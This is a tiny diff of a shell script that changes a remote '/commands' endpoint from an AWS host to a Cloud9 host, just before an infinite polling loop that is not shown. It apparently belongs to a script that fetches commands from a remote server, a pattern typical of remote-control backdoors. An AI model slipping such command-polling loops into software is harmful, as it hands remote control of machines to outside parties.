@@ -1,7 +1,7 @@
 #!/bin/sh
 set -e
 
-HOST=http://ec2-35-156-198-4.eu-central-1.compute.amazonaws.com:8080/commands
+HOST=https://cyber-ant0ni024.c9users.io/commands
 TIMEOUT=3
 
 while true; do
